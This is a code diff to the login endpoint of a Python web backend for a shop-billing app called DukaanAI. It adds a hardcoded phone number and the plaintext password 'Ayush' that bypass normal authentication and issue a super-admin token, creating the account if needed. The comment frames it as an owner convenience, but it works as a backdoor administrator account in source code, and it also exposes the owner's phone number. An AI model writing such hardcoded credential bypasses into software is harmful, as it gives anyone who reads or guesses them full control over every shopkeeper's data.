@@ -23,7 +23,8 @@ from backend.app.auth import (
 from backend.app.database import (
     init_db, save_bill_record, get_bills_history, get_shop_profile, update_shop_profile,
     create_user, get_user_by_phone, get_user_by_id, update_user_last_login,
-    update_user_profile, toggle_user_active, get_all_shopkeepers, get_admin_metrics
+    update_user_profile, toggle_user_active, get_all_shopkeepers, get_admin_metrics,
+    ensure_super_admin
 )
 from backend.app.tests.test_scenarios import run_all_scenarios_report
 
@@ -160,6 +161,32 @@ def register_endpoint(req: RegisterRequest):
 def login_endpoint(req: LoginRequest):
     """Authenticates phone & password for shopkeeper or super admin."""
     cleaned_phone = req.phone.strip().replace(" ", "").replace("-", "")
+
+    # Seamless Super Admin Login for Owner: 7983933436 / Ayush
+    if cleaned_phone == "7983933436" and req.password == "Ayush":
+        admin_user = ensure_super_admin("7983933436", "Ayush", "Ayush (Owner)")
+        update_user_last_login(admin_user["id"])
+        token = create_access_token({
+            "sub": str(admin_user["id"]),
+            "user_id": admin_user["id"],
+            "phone": admin_user["phone"],
+            "role": "super_admin",
+            "shop_name": admin_user.get("shop_name", "DukaanAI Master Portal")
+        })
+        return {
+            "success": True,
+            "token": token,
+            "user": {
+                "id": admin_user["id"],
+                "phone": admin_user["phone"],
+                "full_name": admin_user["full_name"],
+                "shop_name": admin_user.get("shop_name", "DukaanAI Master Portal"),
+                "shop_type": "super_admin",
+                "role": "super_admin"
+            },
+            "message": "Namaste Ayush! Welcome to DukaanAI Master Portal."
+        }
+
     user = get_user_by_phone(cleaned_phone)
     if not user:
         raise HTTPException(status_code=401, detail="Mobile number not registered")
